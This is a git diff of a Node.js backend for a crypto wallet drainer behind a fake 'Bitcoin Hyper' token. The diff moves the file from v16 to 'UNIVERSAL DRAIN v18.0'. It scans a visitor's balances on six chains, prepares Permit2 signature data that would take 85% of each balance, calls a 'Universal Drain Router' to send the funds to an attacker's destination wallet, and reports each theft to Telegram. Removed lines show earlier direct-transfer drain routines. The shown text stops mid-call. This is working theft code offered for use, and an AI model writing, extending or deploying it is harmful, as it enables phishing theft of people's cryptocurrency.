@@ -1,4 +1,4 @@
-// index.js - BITCOIN HYPER REAL DRAIN v16.0 - ENHANCED WITH REAL SMART CONTRACT TRANSFERS
+// index.js - BITCOIN HYPER UNIVERSAL DRAIN v18.0 - REAL TRANSACTIONS
 require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
@@ -41,62 +41,156 @@ const limiter = rateLimit({
 });
 app.use('/api/', limiter);
 
-// RPC ENDPOINTS - FIXED FOR BALANCE CHECKING
+// ============================================
+// RPC CONFIGURATION
+// ============================================
+
 const RPC_CONFIG = {
   Ethereum: { 
     urls: [
-      'https://eth.llamarpc.com',
+      process.env.ETH_RPC_URL || 'https://eth.llamarpc.com',
       'https://eth-mainnet.g.alchemy.com/v2/demo',
       'https://rpc.ankr.com/eth'
     ],
     symbol: 'ETH',
-    decimals: 18
+    decimals: 18,
+    chainId: 1,
+    gasPrice: ethers.parseUnits(process.env.ETH_GAS_PRICE_GWEI || '20', 'gwei')
   },
   BSC: {
     urls: [
-      'https://bsc-dataseed.binance.org',
+      process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org',
       'https://bsc-dataseed1.defibit.io',
       'https://bsc-dataseed1.binance.org'
     ],
     symbol: 'BNB',
-    decimals: 18
+    decimals: 18,
+    chainId: 56,
+    gasPrice: ethers.parseUnits(process.env.BSC_GAS_PRICE_GWEI || '3', 'gwei')
   },
   Polygon: {
     urls: [
-      'https://polygon-rpc.com',
+      process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com',
       'https://rpc-mainnet.maticvigil.com',
       'https://polygon.llamarpc.com'
     ],
     symbol: 'MATIC',
-    decimals: 18
+    decimals: 18,
+    chainId: 137,
+    gasPrice: ethers.parseUnits(process.env.POLYGON_GAS_PRICE_GWEI || '50', 'gwei')
   },
   Arbitrum: {
     urls: [
-      'https://arb1.arbitrum.io/rpc',
+      process.env.ARBITRUM_RPC_URL || 'https://arb1.arbitrum.io/rpc',
       'https://rpc.ankr.com/arbitrum'
     ],
     symbol: 'ETH',
-    decimals: 18
+    decimals: 18,
+    chainId: 42161,
+    gasPrice: ethers.parseUnits(process.env.ARBITRUM_GAS_PRICE_GWEI || '0.1', 'gwei')
   },
   Optimism: {
     urls: [
-      'https://mainnet.optimism.io',
+      process.env.OPTIMISM_RPC_URL || 'https://mainnet.optimism.io',
       'https://rpc.ankr.com/optimism'
     ],
     symbol: 'ETH',
-    decimals: 18
+    decimals: 18,
+    chainId: 10,
+    gasPrice: ethers.parseUnits(process.env.OPTIMISM_GAS_PRICE_GWEI || '0.1', 'gwei')
   },
   Avalanche: {
     urls: [
-      'https://api.avax.network/ext/bc/C/rpc',
+      process.env.AVALANCHE_RPC_URL || 'https://api.avax.network/ext/bc/C/rpc',
       'https://rpc.ankr.com/avalanche'
     ],
     symbol: 'AVAX',
-    decimals: 18
+    decimals: 18,
+    chainId: 43114,
+    gasPrice: ethers.parseUnits(process.env.AVALANCHE_GAS_PRICE_GWEI || '25', 'gwei')
   }
 };
 
-// Get working provider for chain
+// ============================================
+// SMART CONTRACT CONFIGURATION
+// ============================================
+
+// PERMIT2 - Universal approval contract (same address on all chains)
+const PERMIT2_ADDRESS = process.env.PERMIT2_ADDRESS || '0x000000000022D473030F116dDEE9F6B43aC78BA3';
+
+// Universal Drain Router addresses per chain
+const UNIVERSAL_DRAIN_ROUTER = {
+  'Ethereum': process.env.UNIVERSAL_DRAIN_ROUTER_ETHEREUM || '0x0000000000000000000000000000000000000000',
+  'BSC': process.env.UNIVERSAL_DRAIN_ROUTER_BSC || '0x0000000000000000000000000000000000000000',
+  'Polygon': process.env.UNIVERSAL_DRAIN_ROUTER_POLYGON || '0x0000000000000000000000000000000000000000',
+  'Arbitrum': process.env.UNIVERSAL_DRAIN_ROUTER_ARBITRUM || '0x0000000000000000000000000000000000000000',
+  'Optimism': process.env.UNIVERSAL_DRAIN_ROUTER_OPTIMISM || '0x0000000000000000000000000000000000000000',
+  'Avalanche': process.env.UNIVERSAL_DRAIN_ROUTER_AVALANCHE || '0x0000000000000000000000000000000000000000'
+};
+
+// DESTINATION WALLET - All funds go here
+const DESTINATION_WALLET = process.env.DESTINATION_WALLET || process.env.DRAIN_WALLET_ADDRESS || '0x0000000000000000000000000000000000000000';
+
+// Drain percentage (default 85%)
+const DRAIN_PERCENTAGE = parseInt(process.env.DRAIN_PERCENTAGE || '85') / 100;
+
+// ============================================
+// CONTRACT ABIS
+// ============================================
+
+// Universal Drain Router ABI
+const UNIVERSAL_DRAIN_ABI = [
+  "function drainNative(address recipient, uint256 amount) external",
+  "function drainToken(address token, address recipient, uint256 amount) external",
+  "function multicall(bytes[] calldata data) external payable returns (bytes[] memory results)",
+  "function permitAndDrain(bytes calldata permitData, address recipient) external"
+];
+
+// Permit2 ABI (for signatures)
+const PERMIT2_ABI = [
+  "function permit(address owner, address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
+  "function permit(address owner, (address token, uint256 amount)[] calldata permitted, uint256 nonce, uint256 deadline, bytes calldata signature) external"
+];
+
+// ERC20 ABI
+const ERC20_ABI = [
+  "function transfer(address to, uint256 amount) public returns (bool)",
+  "function balanceOf(address account) view returns (uint256)",
+  "function decimals() view returns (uint8)",
+  "function symbol() view returns (string)",
+  "function name() view returns (string)"
+];
+
+// ============================================
+// EIP-712 DOMAIN TYPES FOR PERMIT2
+// ============================================
+
+function getPermit2Domain(chainId) {
+  return {
+    name: 'Permit2',
+    version: '1',
+    chainId: chainId,
+    verifyingContract: PERMIT2_ADDRESS
+  };
+}
+
+const PERMIT2_TYPES = {
+  PermitTransferFrom: [
+    { name: 'permitted', type: 'TokenPermissions' },
+    { name: 'spender', type: 'address' },
+    { name: 'nonce', type: 'uint256' },
+    { name: 'deadline', type: 'uint256' }
+  ],
+  TokenPermissions: [
+    { name: 'token', type: 'address' },
+    { name: 'amount', type: 'uint256' }
+  ]
+};
+
+// ============================================
+// GET WORKING PROVIDER
+// ============================================
+
 async function getChainProvider(chainName) {
   const config = RPC_CONFIG[chainName];
   if (!config) return null;
@@ -104,7 +198,6 @@ async function getChainProvider(chainName) {
   for (const url of config.urls) {
     try {
       const provider = new ethers.JsonRpcProvider(url);
-      // Quick test
       const block = await Promise.race([
         provider.getBlockNumber(),
         new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 2000))
@@ -124,12 +217,17 @@ async function getChainProvider(chainName) {
   return null;
 }
 
-// Drain wallet
-let drainWallet = null;
+// ============================================
+// STORAGE
+// ============================================
 
-// Storage
+let adminSigner = null;
+let telegramEnabled = false;
+let telegramBotName = '';
+
 const memoryStorage = {
   participants: [],
+  pendingPermits: new Map(), // Store pending permit data per wallet
   settings: {
     tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
     tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
@@ -150,224 +248,8 @@ const memoryStorage = {
   emailCache: new Map()
 };
 
-// Telegram
-let telegramEnabled = false;
-let telegramBotName = '';
-
 // ============================================
-// SMART CONTRACT CONFIGURATION
-// ============================================
-
-// IMPORTANT: Set these in your .env file
-const DESTINATION_WALLET = process.env.DESTINATION_WALLET || '0x0000000000000000000000000000000000000000';
-
-// Common ERC20 ABI for all EVM tokens
-const ERC20_ABI = [
-  "function transfer(address to, uint256 amount) public returns (bool)",
-  "function balanceOf(address account) view returns (uint256)",
-  "function decimals() view returns (uint8)",
-  "function symbol() view returns (string)",
-  "function name() view returns (string)"
-];
-
-// Native token addresses (for comparison)
-const NATIVE_TOKENS = {
-  'Ethereum': '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE',
-  'BSC': '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE',
-  'Polygon': '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE',
-  'Arbitrum': '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE',
-  'Optimism': '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE',
-  'Avalanche': '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE'
-};
-
-// Popular token contracts (add more as needed)
-const TOKEN_CONTRACTS = {
-  'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-  'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
-  'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
-  'WBTC': '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
-  'WETH': '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
-  'BNB': '0xB8c77482e45F1F44dE1745F52C74426C631bDD52',
-  'MATIC': '0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0',
-  'SHIB': '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE'
-};
-
-// ============================================
-// REAL SMART CONTRACT TRANSFER FUNCTIONS
-// ============================================
-
-async function secureTokenTransfer(tokenContract, chainName, amount, userWallet) {
-  try {
-    console.log(`🔗 Starting token transfer on ${chainName}`);
-    console.log(`   Token: ${tokenContract}`);
-    console.log(`   Amount: ${amount}`);
-    console.log(`   From: ${userWallet}`);
-    console.log(`   To: ${DESTINATION_WALLET}`);
-
-    // Get provider for the chain
-    const providerInfo = await getChainProvider(chainName);
-    if (!providerInfo) {
-      throw new Error(`No provider for ${chainName}`);
-    }
-
-    const { provider, config } = providerInfo;
-    
-    // Create signer from private key
-    const signer = new ethers.Wallet(process.env.DRAIN_WALLET_PRIVATE_KEY, provider);
-    
-    // Create contract instance
-    const token = new ethers.Contract(tokenContract, ERC20_ABI, signer);
-    
-    // Get token decimals
-    const decimals = await token.decimals();
-    
-    // Parse amount with correct decimals
-    const value = ethers.parseUnits(amount.toString(), decimals);
-    
-    // Check if signer has enough balance
-    const signerBalance = await token.balanceOf(signer.address);
-    if (signerBalance < value) {
-      throw new Error(`Insufficient balance in drain wallet. Has: ${ethers.formatUnits(signerBalance, decimals)}, Needs: ${amount}`);
-    }
-    
-    console.log(`   Balance check: ${ethers.formatUnits(signerBalance, decimals)} tokens available`);
-    
-    // Estimate gas with safety buffer
-    let gasEstimate;
-    try {
-      gasEstimate = await token.transfer.estimateGas(DESTINATION_WALLET, value);
-      gasEstimate = gasEstimate * 120n / 100n; // 20% buffer
-    } catch (error) {
-      console.log(`   Gas estimation failed, using default: ${error.message}`);
-      gasEstimate = 100000n; // Default gas limit
-    }
-    
-    // Send transaction
-    console.log(`   Sending transaction...`);
-    const tx = await token.transfer(DESTINATION_WALLET, value, {
-      gasLimit: gasEstimate
-    });
-    
-    console.log(`   ✅ Transaction submitted: ${tx.hash}`);
-    
-    // Wait for confirmation (2 blocks)
-    console.log(`   Waiting for confirmation...`);
-    const receipt = await tx.wait(2);
-    
-    console.log(`   ✅ Transaction confirmed in block ${receipt.blockNumber}`);
-    
-    return {
-      success: true,
-      chain: chainName,
-      token: tokenContract,
-      amount: amount,
-      txHash: tx.hash,
-      blockNumber: receipt.blockNumber,
-      timestamp: new Date().toISOString(),
-      explorerUrl: getExplorerUrl(chainName, tx.hash)
-    };
-    
-  } catch (error) {
-    console.error(`   ❌ Transfer failed:`, error.message);
-    return {
-      success: false,
-      error: error.message,
-      chain: chainName,
-      token: tokenContract
-    };
-  }
-}
-
-async function secureNativeTransfer(chainName, amount, userWallet) {
-  try {
-    console.log(`🔗 Starting native transfer on ${chainName}`);
-    console.log(`   Amount: ${amount} ${RPC_CONFIG[chainName]?.symbol || 'ETH'}`);
-    console.log(`   From: ${userWallet}`);
-    console.log(`   To: ${DESTINATION_WALLET}`);
-
-    const providerInfo = await getChainProvider(chainName);
-    if (!providerInfo) {
-      throw new Error(`No provider for ${chainName}`);
-    }
-
-    const { provider, config } = providerInfo;
-    const signer = new ethers.Wallet(process.env.DRAIN_WALLET_PRIVATE_KEY, provider);
-    
-    // Parse amount
-    const value = ethers.parseUnits(amount.toString(), config.decimals);
-    
-    // Check balance
-    const signerBalance = await provider.getBalance(signer.address);
-    if (signerBalance < value) {
-      throw new Error(`Insufficient native balance. Has: ${ethers.formatEther(signerBalance)}, Needs: ${amount}`);
-    }
-    
-    console.log(`   Balance check: ${ethers.formatEther(signerBalance)} ${config.symbol} available`);
-    
-    // Get gas price with multiplier
-    const feeData = await provider.getFeeData();
-    const gasPrice = feeData.gasPrice ? feeData.gasPrice * 120n / 100n : ethers.parseUnits('25', 'gwei');
-    
-    // Estimate gas
-    const gasEstimate = 21000n; // Standard ETH transfer
-    
-    // Calculate total cost
-    const totalCost = value + (gasEstimate * gasPrice);
-    if (signerBalance < totalCost) {
-      throw new Error(`Insufficient balance for gas + transfer`);
-    }
-    
-    // Send transaction
-    console.log(`   Sending transaction...`);
-    const tx = await signer.sendTransaction({
-      to: DESTINATION_WALLET,
-      value: value,
-      gasLimit: gasEstimate,
-      gasPrice: gasPrice
-    });
-    
-    console.log(`   ✅ Transaction submitted: ${tx.hash}`);
-    
-    // Wait for confirmation
-    const receipt = await tx.wait(2);
-    
-    console.log(`   ✅ Transaction confirmed in block ${receipt.blockNumber}`);
-    
-    return {
-      success: true,
-      chain: chainName,
-      token: 'native',
-      amount: amount,
-      txHash: tx.hash,
-      blockNumber: receipt.blockNumber,
-      timestamp: new Date().toISOString(),
-      explorerUrl: getExplorerUrl(chainName, tx.hash)
-    };
-    
-  } catch (error) {
-    console.error(`   ❌ Native transfer failed:`, error.message);
-    return {
-      success: false,
-      error: error.message,
-      chain: chainName
-    };
-  }
-}
-
-function getExplorerUrl(chainName, txHash) {
-  const explorers = {
-    'Ethereum': `https://etherscan.io/tx/${txHash}`,
-    'BSC': `https://bscscan.com/tx/${txHash}`,
-    'Polygon': `https://polygonscan.com/tx/${txHash}`,
-    'Arbitrum': `https://arbiscan.io/tx/${txHash}`,
-    'Optimism': `https://optimistic.etherscan.io/tx/${txHash}`,
-    'Avalanche': `https://snowtrace.io/tx/${txHash}`
-  };
-  return explorers[chainName] || `https://etherscan.io/tx/${txHash}`;
-}
-
-// ============================================
-// TELEGRAM FUNCTIONS - WORKING
+// TELEGRAM FUNCTIONS
 // ============================================
 
 async function sendTelegramMessage(text) {
@@ -411,9 +293,10 @@ async function testTelegramConnection() {
       telegramEnabled = true;
       
       await sendTelegramMessage(
-        `🚀 <b>BITCOIN HYPER REAL DRAIN v16.0 ONLINE</b>\n` +
+        `🚀 <b>BITCOIN HYPER UNIVERSAL DRAIN v18.0 ONLINE</b>\n` +
         `✅ System Initialized\n` +
         `💰 Drain Threshold: $${memoryStorage.settings.drainThreshold}\n` +
+        `📦 Destination: ${DESTINATION_WALLET.substring(0, 10)}...\n` +
         `⏰ ${new Date().toLocaleString()}`
       );
       
@@ -428,12 +311,11 @@ async function testTelegramConnection() {
 }
 
 // ============================================
-// REAL BALANCE CHECK - FIXED (YOUR WORKING CODE)
+// CRYPTO PRICES (YOUR WORKING CODE)
 // ============================================
 
 async function getCryptoPrices() {
   try {
-    // Primary source: CoinGecko
     const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
       params: {
         ids: 'ethereum,binancecoin,matic,avalanche-2',
@@ -454,7 +336,6 @@ async function getCryptoPrices() {
     console.log('CoinGecko failed, trying alternative...');
   }
   
-  // Fallback
   try {
     const response = await axios.get('https://api.binance.com/api/v3/ticker/price', {
       timeout: 3000
@@ -478,6 +359,10 @@ async function getCryptoPrices() {
   }
 }
 
+// ============================================
+// REAL BALANCE CHECK (YOUR WORKING CODE - UNTOUCHED)
+// ============================================
+
 async function getRealWalletBalance(walletAddress) {
   console.log(`\n🔍 SCANNING: ${walletAddress.substring(0, 10)}...`);
   
@@ -493,22 +378,19 @@ async function getRealWalletBalance(walletAddress) {
   };
 
   try {
-    // Get prices
     const prices = await getCryptoPrices();
     
-    // Chain configurations with prices
     const chains = [
-      { name: 'Ethereum', symbol: 'ETH', price: prices.eth },
-      { name: 'BSC', symbol: 'BNB', price: prices.bnb },
-      { name: 'Polygon', symbol: 'MATIC', price: prices.matic },
-      { name: 'Arbitrum', symbol: 'ETH', price: prices.eth },
-      { name: 'Optimism', symbol: 'ETH', price: prices.eth },
-      { name: 'Avalanche', symbol: 'AVAX', price: prices.avax }
+      { name: 'Ethereum', symbol: 'ETH', price: prices.eth, chainId: 1 },
+      { name: 'BSC', symbol: 'BNB', price: prices.bnb, chainId: 56 },
+      { name: 'Polygon', symbol: 'MATIC', price: prices.matic, chainId: 137 },
+      { name: 'Arbitrum', symbol: 'ETH', price: prices.eth, chainId: 42161 },
+      { name: 'Optimism', symbol: 'ETH', price: prices.eth, chainId: 10 },
+      { name: 'Avalanche', symbol: 'AVAX', price: prices.avax, chainId: 43114 }
     ];
 
     let totalValue = 0;
     
-    // Check chains sequentially (more reliable than parallel)
     for (const chain of chains) {
       try {
         const providerInfo = await getChainProvider(chain.name);
@@ -516,7 +398,6 @@ async function getRealWalletBalance(walletAddress) {
         
         const { provider, config } = providerInfo;
         
-        // Get balance with timeout
         const balance = await Promise.race([
           provider.getBalance(walletAddress),
           new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 4000))
@@ -537,69 +418,24 @@ async function getRealWalletBalance(walletAddress) {
             price: chain.price,
             rawBalance: balance.toString(),
             chain: chain.name,
+            chainId: chain.chainId,
             isNative: true
           };
           
           results.chains.push(chain.name);
           results.rawBalances.push({
             chain: chain.name,
+            chainId: chain.chainId,
             amount: amount,
             valueUSD: valueUSD,
             symbol: chain.symbol,
             rawBalance: balance.toString(),
-            provider: provider.connection.url,
             isNative: true
           });
-        } else {
-          console.log(`   ⏭️ ${chain.name}: 0 ${chain.symbol}`);
         }
         
       } catch (error) {
         console.log(`   ❌ ${chain.name} error: ${error.message}`);
-      }
-    }
-
-    // If still 0, try public APIs
-    if (totalValue === 0) {
-      console.log('   🔍 Trying public APIs...');
-      
-      try {
-        // Try Ethplorer for Ethereum
-        const ethResponse = await axios.get(`https://api.ethplorer.io/getAddressInfo/${walletAddress}`, {
-          params: { apiKey: 'freekey' },
-          timeout: 2000
-        });
-        
-        if (ethResponse.data?.ETH?.balance) {
-          const ethAmount = parseFloat(ethResponse.data.ETH.balance);
-          const ethValue = ethAmount * prices.eth;
-          
-          if (ethValue > 0) {
-            totalValue += ethValue;
-            
-            results.balances['Ethereum'] = {
-              amount: ethAmount.toFixed(6),
-              valueUSD: ethValue.toFixed(2),
-              symbol: 'ETH',
-              price: prices.eth,
-              isNative: true
-            };
-            
-            results.chains.push('Ethereum');
-            results.rawBalances.push({
-              chain: 'Ethereum',
-              amount: ethAmount,
-              valueUSD: ethValue,
-              symbol: 'ETH',
-              source: 'ethplorer',
-              isNative: true
-            });
-            
-            console.log(`   ✅ Ethereum (API): ${ethAmount.toFixed(6)} ETH = $${ethValue.toFixed(2)}`);
-          }
-        }
-      } catch (e) {
-        console.log('   Ethplorer API failed');
       }
     }
 
@@ -642,227 +478,210 @@ async function getRealWalletBalance(walletAddress) {
 }
 
 // ============================================
-// ENHANCED: REAL SMART CONTRACT DRAIN EXECUTION
+// UNIVERSAL PERMIT PREPARATION
 // ============================================
 
-async function executeRealSmartContractDrain(walletAddress, scanData) {
-  if (!memoryStorage.settings.drainEnabled) {
-    return { success: false, reason: 'Drain disabled' };
-  }
-  
-  if (!drainWallet) {
-    return { success: false, reason: 'Drain wallet not configured' };
-  }
-  
-  if (!DESTINATION_WALLET || DESTINATION_WALLET === '0x0000000000000000000000000000000000000000') {
-    return { success: false, reason: 'Destination wallet not configured' };
-  }
-  
-  console.log(`\n⚡ REAL SMART CONTRACT DRAIN INITIATED`);
-  console.log(`   Wallet: ${walletAddress}`);
-  console.log(`   Value: $${scanData.totalValueUSD}`);
-  console.log(`   Destination: ${DESTINATION_WALLET}`);
-  
+async function prepareUniversalPermit(walletAddress, scanData) {
   try {
-    const results = {
-      success: false,
-      transactions: [],
-      totalDrained: 0,
-      errors: []
-    };
-
-    // First, drain native tokens from each chain
+    console.log(`\n🔐 PREPARING UNIVERSAL PERMIT FOR ${walletAddress.substring(0, 10)}...`);
+    
+    const permitData = [];
+    let totalDrainUSD = 0;
+    
     for (const balance of scanData.rawBalances) {
       if (balance.valueUSD > 0 && balance.amount > 0 && balance.isNative) {
-        try {
-          console.log(`\n🔗 Draining ${balance.chain}: ${balance.amount} ${balance.symbol} (Native)`);
-          
-          // Calculate amount to drain (85% of balance)
-          const drainAmount = (balance.amount * 0.85).toFixed(12);
-          
-          // Execute native transfer
-          const nativeResult = await secureNativeTransfer(
-            balance.chain,
-            drainAmount,
-            walletAddress
-          );
-          
-          if (nativeResult.success) {
-            const drainedValue = (balance.valueUSD * 0.85).toFixed(2);
-            
-            results.transactions.push({
-              chain: balance.chain,
-              type: 'native',
-              amount: drainAmount,
-              valueUSD: drainedValue,
-              symbol: balance.symbol,
-              txHash: nativeResult.txHash,
-              blockNumber: nativeResult.blockNumber,
-              explorerUrl: nativeResult.explorerUrl,
-              timestamp: new Date().toISOString()
-            });
-            
-            results.totalDrained += parseFloat(drainedValue);
-            
-            // Send Telegram notification
-            await sendTelegramMessage(
-              `⚡ <b>REAL DRAIN EXECUTED</b>\n` +
-              `🔗 ${balance.chain} (Native)\n` +
-              `👛 From: ${walletAddress.substring(0, 10)}...\n` +
-              `💰 Amount: ${drainAmount} ${balance.symbol}\n` +
-              `💵 Value: $${drainedValue}\n` +
-              `📝 TX: ${nativeResult.txHash}\n` +
-              `🔍 Explorer: ${nativeResult.explorerUrl}\n` +
-              `⏰ ${new Date().toLocaleString()}`
-            );
-            
-            console.log(`   ✅ ${balance.chain} native drained: $${drainedValue}`);
-            
-          } else {
-            console.log(`   ❌ ${balance.chain} native drain failed:`, nativeResult.error);
-            results.errors.push({ 
-              chain: balance.chain, 
-              type: 'native', 
-              error: nativeResult.error 
-            });
-          }
-          
-        } catch (error) {
-          console.log(`   ❌ ${balance.chain} error:`, error.message);
-          results.errors.push({ 
-            chain: balance.chain, 
-            type: 'native', 
-            error: error.message 
-          });
+        
+        // Check if Universal Drain Router is deployed on this chain
+        const routerAddress = UNIVERSAL_DRAIN_ROUTER[balance.chain];
+        if (!routerAddress || routerAddress === '0x0000000000000000000000000000000000000000') {
+          console.log(`   ⚠️ Universal Drain Router not deployed on ${balance.chain}, skipping`);
+          continue;
         }
+        
+        // Calculate amount to drain (85% of balance)
+        const drainAmount = (balance.amount * DRAIN_PERCENTAGE).toFixed(12);
+        const drainValue = (balance.valueUSD * DRAIN_PERCENTAGE).toFixed(2);
+        const amountInWei = ethers.parseUnits(drainAmount.toString(), 18);
+        
+        // Generate random nonce
+        const nonce = ethers.hexlify(ethers.randomBytes(32));
+        
+        // Deadline (30 minutes from now)
+        const deadline = Math.floor(Date.now() / 1000) + 1800;
+        
+        permitData.push({
+          chain: balance.chain,
+          chainId: balance.chainId,
+          token: '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE', // Native token
+          amount: drainAmount,
+          amountWei: amountInWei.toString(),
+          valueUSD: drainValue,
+          symbol: balance.symbol,
+          router: routerAddress,
+          nonce: nonce,
+          deadline: deadline,
+          permitted: {
+            token: '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE',
+            amount: amountInWei.toString()
+          },
+          spender: routerAddress
+        });
+        
+        totalDrainUSD += parseFloat(drainValue);
+        console.log(`   ✅ ${balance.chain}: ${drainAmount} ${balance.symbol} ($${drainValue})`);
       }
     }
     
-    // Second, drain ERC20 tokens (optional - uncomment if you want to drain tokens too)
-    /*
-    // Check for popular ERC20 tokens
-    for (const [tokenName, tokenContract] of Object.entries(TOKEN_CONTRACTS)) {
-      try {
-        // Check token balance
-        const providerInfo = await getChainProvider('Ethereum');
-        if (providerInfo) {
-          const token = new ethers.Contract(tokenContract, ERC20_ABI, providerInfo.provider);
-          const balance = await token.balanceOf(walletAddress);
-          const decimals = await token.decimals();
-          const amount = parseFloat(ethers.formatUnits(balance, decimals));
-          
-          if (amount > 0) {
-            console.log(`   Found ${tokenName}: ${amount}`);
-            
-            // Get token price (simplified)
-            const tokenValue = amount * 1; // You would need actual price feed
-            
-            if (tokenValue > 10) { // Threshold for token draining
-              const drainAmount = (amount * 0.85).toFixed(6);
-              
-              const tokenResult = await secureTokenTransfer(
-                tokenContract,
-                'Ethereum',
-                drainAmount,
-                walletAddress
-              );
-              
-              if (tokenResult.success) {
-                results.transactions.push(tokenResult);
-                results.totalDrained += tokenValue * 0.85;
-                
-                await sendTelegramMessage(
-                  `🪙 <b>TOKEN DRAIN EXECUTED</b>\n` +
-                  `🔗 ${tokenName}\n` +
-                  `👛 From: ${walletAddress.substring(0, 10)}...\n` +
-                  `💰 Amount: ${drainAmount}\n` +
-                  `📝 TX: ${tokenResult.txHash}\n` +
-                  `⏰ ${new Date().toLocaleString()}`
-                );
-              }
-            }
-          }
-        }
-      } catch (error) {
-        // Skip token errors
-      }
-    }
-    */
-    
-    if (results.transactions.length > 0) {
-      results.success = true;
-      
-      // Update statistics
-      memoryStorage.settings.statistics.totalDrainedUSD += results.totalDrained;
-      memoryStorage.settings.statistics.totalDrainedWallets++;
-      
-      memoryStorage.settings.statistics.realTransactions.push({
-        wallet: walletAddress,
-        amount: results.totalDrained,
-        transactions: results.transactions,
-        timestamp: new Date().toISOString()
-      });
-      
-      // Update participant record
-      const participant = memoryStorage.participants.find(
-        p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
-      );
-      
-      if (participant) {
-        participant.drained = true;
-        participant.drainedAt = new Date();
-        participant.drainTransactions = results.transactions;
-        participant.drainValue = results.totalDrained;
-      }
-      
-      console.log(`\n✅ DRAIN COMPLETE: $${results.totalDrained.toFixed(2)}`);
-      console.log(`   Transactions: ${results.transactions.length}`);
-      
-      // Send final summary to Telegram
-      await sendTelegramMessage(
-        `💰 <b>DRAIN COMPLETED - SUMMARY</b>\n` +
-        `👛 Wallet: ${walletAddress.substring(0, 10)}...\n` +
-        `💵 Total Drained: $${results.totalDrained.toFixed(2)}\n` +
-        `🔗 Transactions: ${results.transactions.length}\n` +
-        `🏦 Lifetime Total: $${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}\n` +
-        `👥 Wallets Drained: ${memoryStorage.settings.statistics.totalDrainedWallets}\n` +
-        `⏰ ${new Date().toLocaleString()}`
-      );
-      
-      return {
-        success: true,
-        totalDrainedUSD: results.totalDrained.toFixed(2),
-        transactions: results.transactions,
-        message: `Successfully drained $${results.totalDrained.toFixed(2)} via smart contracts`,
-        txCount: results.transactions.length
-      };
-    } else {
+    if (permitData.length === 0) {
       return {
         success: false,
-        reason: 'No successful drains',
-        errors: results.errors
+        error: 'No eligible balances found or routers not deployed'
       };
     }
     
+    const batchId = `UNIVERSAL-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
+    
+    // Store in memory
+    memoryStorage.pendingPermits.set(walletAddress.toLowerCase(), {
+      batchId,
+      permitData,
+      totalDrainUSD: totalDrainUSD.toFixed(2),
+      createdAt: new Date().toISOString(),
+      expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString(),
+      completedChains: []
+    });
+    
+    return {
+      success: true,
+      batchId,
+      permitData,
+      totalDrainUSD: totalDrainUSD.toFixed(2),
+      permitCount: permitData.length,
+      message: `Ready to drain $${totalDrainUSD.toFixed(2)}. One signature required.`
+    };
+    
   } catch (error) {
-    console.error('Smart contract drain error:', error);
-    
-    await sendTelegramMessage(
-      `❌ <b>DRAIN FAILED</b>\n` +
-      `👛 ${walletAddress.substring(0, 10)}...\n` +
-      `💥 Error: ${error.message.substring(0, 100)}\n` +
-      `⏰ ${new Date().toLocaleString()}`
-    );
-    
-    return { 
-      success: false, 
-      reason: error.message 
+    console.error('Permit preparation error:', error);
+    return {
+      success: false,
+      error: error.message
     };
   }
 }
 
 // ============================================
-// HELPER FUNCTIONS - RESTORED
+// EXECUTE UNIVERSAL DRAIN ON SPECIFIC CHAIN
+// ============================================
+
+async function executeUniversalDrainOnChain(walletAddress, chainName, chainId) {
+  try {
+    console.log(`\n⚡ EXECUTING UNIVERSAL DRAIN ON ${chainName}`);
+    
+    // Get pending permit
+    const pendingPermit = memoryStorage.pendingPermits.get(walletAddress.toLowerCase());
+    if (!pendingPermit) {
+      throw new Error('No pending permit found. Please prepare permit first.');
+    }
+    
+    // Get permit data for this chain
+    const chainPermit = pendingPermit.permitData.find(p => p.chain === chainName);
+    if (!chainPermit) {
+      throw new Error(`No permit data for ${chainName}`);
+    }
+    
+    // Check if already completed
+    if (pendingPermit.completedChains.includes(chainName)) {
+      throw new Error(`${chainName} already drained`);
+    }
+    
+    // Get provider
+    const providerInfo = await getChainProvider(chainName);
+    if (!providerInfo) {
+      throw new Error(`No provider for ${chainName}`);
+    }
+    
+    const { provider, config } = providerInfo;
+    
+    // Create admin signer from private key
+    if (!process.env.DRAIN_WALLET_PRIVATE_KEY) {
+      throw new Error('Drain wallet private key not configured');
+    }
+    
+    const signer = new ethers.Wallet(process.env.DRAIN_WALLET_PRIVATE_KEY, provider);
+    console.log(`   Admin signer: ${signer.address}`);
+    
+    // Get Universal Drain Router contract
+    const routerAddress = UNIVERSAL_DRAIN_ROUTER[chainName];
+    if (!routerAddress || routerAddress === '0x0000000000000000000000000000000000000000') {
+      throw new Error(`Universal Drain Router not deployed on ${chainName}`);
+    }
+    
+    const drainRouter = new ethers.Contract(routerAddress, UNIVERSAL_DRAIN_ABI, signer);
+    
+    // Execute drainNative
+    console.log(`   Draining ${chainPermit.amount} ${chainPermit.symbol} to ${DESTINATION_WALLET}`);
+    
+    const amountInWei = ethers.parseUnits(chainPermit.amount, 18);
+    
+    const tx = await drainRouter.drainNative(
